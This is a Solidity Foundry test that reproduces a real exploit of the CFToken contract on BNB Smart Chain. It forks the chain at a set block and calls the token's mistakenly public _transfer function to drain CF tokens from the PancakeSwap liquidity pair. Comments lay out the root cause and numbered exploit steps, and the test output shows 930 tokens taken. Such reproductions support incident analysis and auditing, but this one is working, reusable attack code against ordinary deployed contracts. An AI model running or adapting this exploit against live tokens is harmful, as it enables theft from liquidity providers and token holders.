// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// source
// https://mp.weixin.qq.com/s/_7vIlVBI9g9IgGpS9OwPIQ
// attack tx: 0xc7647406542f8f2473a06fea142d223022370aa5722c044c2b7ea030b8965dd0
// test result

// > forge test --contracts ./src/cftoken_exp.sol -vv
// [⠘] Compiling...
// No files changed, compilation skipped

// Running 2 tests for test/Counter.t.sol:CounterTest
// [PASS] testIncrement() (gas: 28334)
// [PASS] testSetNumber(uint256) (runs: 256, μ: 27476, ~: 28409)
// Test result: ok. 2 passed; 0 failed; finished in 16.14ms

// Running 1 test for src/cftoken_exp.sol:ContractTest
// [PASS] testExploit() (gas: 86577)
// Logs:
//   Before exploit, cftoken balance:: 0
//   After exploit, cftoken balance:: 930000000000000000000

// Test result: ok. 1 passed; 0 failed; finished in 9.72s%

contract ContractTest is Test {
    address private cftoken = 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196;
    address private cfpair = 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8546", 16_841_980); //fork bsc at block 16841980
    }

    function testExploit() public {
        emit log_named_uint("Before exploit, cftoken balance:", ICFToken(cftoken).balanceOf(address(msg.sender)));

        // VULNERABILITY: Public _transfer Allows Arbitrary From-Address Token Theft (Unauthorized Balance Transfer)
        // Root cause: In CFToken.sol, `_transfer(address from, address to, uint256 amount)` is declared `public`
        // (not `internal`), and unconditionally performs:
        //   _tOwned[from] = _tOwned[from].sub(amount);
        //   _tOwned[to] = _tOwned[to].add(acceptAmount);
        //   emit Transfer(from, to, acceptAmount);
        // WITHOUT requiring that msg.sender == from (unlike `transfer`) or a valid allowance (unlike `transferFrom`).
        // The only gate is an optional whitelist check on (msgSenderWhiteList[msg.sender] && fromWhiteList[from] && toWhiteList[to])
        // when useWhiteListSwith==true. The pair (cfpair) was registered in fromWhiteList + uniswapV2PairList.
        // A caller who satisfies the msgSender whitelist (or when switch==false) can therefore move tokens out of ANY
        // holder, including the Pancake pair's entire CFToken reserve.
        //
        // Why it works: Token balances are purely in the _tOwned mapping. The LP pair contract's CF "holding"
        // is just _tOwned[cfpair]. No approval, no pair.burn/swap/transfer, no authorization from the pair is needed.
        // Direct public call spoofs the sender of the tokens.
        //
        // Impact: Immediate theft of all CF liquidity tokens from the pair (here ~1000 CF extracted, net 930 after 7% "buy" fee split).
        // LP providers lose their CF side of the pool; attacker receives freely minted CF. Pool becomes imbalanced.
        // The fee logic (because from==pair) even routes part of "fee" to callback/foundation, but attacker still profits.
        //
        // EXPLOIT STEPS:
        // 1. Identify the CF/USDT PancakePair address holding CF reserves (cfpair) and confirm it is in fromWhiteList/uniswapV2PairList.
        // 2. Confirm caller (or switch state) allows msgSenderWhiteList for the direct caller of _transfer.
        // 3. Call token._transfer(cfpair, attacker, largeAmount) directly (public selector is exposed).
        // 4. Inside _transfer: since from is pair, fee=7% applied (if buyback not maxed), but _tOwned[pair] -= amount, _tOwned[attacker] += (amount-fee).
        // 5. Attacker now holds the stolen CF (930 tokens in PoC); pair's balance is drained without any on-pair action.
        // 6. (Optional) repeat or take the full pair balance to empty the CF side of LP.
        ICFToken(cftoken)._transfer(cfpair, payable(msg.sender), 1_000_000_000_000_000_000_000);

        emit log_named_uint("After exploit, cftoken balance:", ICFToken(cftoken).balanceOf(address(msg.sender)));
    }
}
